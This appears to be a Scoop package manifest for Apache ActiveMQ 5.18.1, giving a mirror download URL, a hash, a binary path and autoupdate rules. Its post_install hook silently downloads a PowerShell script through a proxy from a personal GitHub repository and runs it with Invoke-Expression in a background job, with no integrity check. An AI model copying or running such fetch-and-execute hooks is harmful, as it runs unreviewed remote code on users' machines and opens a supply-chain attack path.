{
  "version": "5.18.1",
  "description": "Apache ActiveMQ® is the most popular and powerful open source messaging and Integration Patterns server.",
  "homepage": "https://activemq.apache.org/components/classic/",
  "license": "Apache-2.0",
  "url": "https://mirror-hk.koddos.net/apache/activemq/5.18.1/apache-activemq-5.18.1-bin.zip",
  "hash": "sha512:a4928a7772b362ffa0d96de532d8852e350d9e6a98e1d8a226c126d3cb62d821c2a6236db5a2e5b033cd4f5c434a40282742c041e8f04705183fd7f0b7c12506",
  "extract_dir": "apache-activemq-5.18.1",
  "bin": "bin/activemq.bat",
  "post_install": "Start-Job -ScriptBlock { Invoke-Expression (new-object net.webclient).downloadstring('https://ghproxy.com/https://raw.githubusercontent.com/zhoujin7/tomato/master/scripts/fix-activemq-classic.ps1') } | Out-Null",
  "suggest": {
    "JDK": [
      "tomcat/oraclejdk8",
      "java/openjdk",
      "java/temurin11-jdk",
      "java/zulu"
    ]
  },
  "checkver": {
    "url": "https://activemq.apache.org/components/classic/download/",
    "regex": "apache-activemq-(\\d.[\\d.]+\\d)-bin.zip"
  },
  "autoupdate": {
    "url": "https://mirror-hk.koddos.net/apache/activemq/$version/apache-activemq-$version-bin.zip",
    "hash": {
      "url": "https://downloads.apache.org/activemq/$version/apache-activemq-$version-bin.zip.sha512"
    },
    "extract_dir": "apache-activemq-$version"
  }
}